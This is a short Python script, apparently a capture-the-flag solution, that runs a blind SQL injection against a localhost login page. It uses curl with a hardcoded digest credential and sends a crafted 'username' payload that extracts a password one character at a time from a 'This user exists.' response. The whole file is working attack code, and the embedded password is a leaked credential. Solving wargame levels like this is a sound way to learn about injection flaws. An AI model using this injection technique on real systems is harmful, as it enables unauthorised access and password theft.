import subprocess
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
cmd = ['curl', '--digest', '--user', 'level11:Quukei4f', 'http://localhost', '--data-raw']
confirm_string = "This user exists."
pw_str = ""
for i in range(0, 8):
    for c in chars:
        append_string = 'username=%22+or+true+and+BINARY+password+like+%22' + pw_str + c + '%25'
        cmd.append(append_string)
        result = subprocess.run(cmd, stdout=subprocess.PIPE).stdout.decode('utf-8')
        cmd.pop(6)
        if confirm_string in result:
            pw_str += c
            break

print("The Password is:")
print(pw_str)
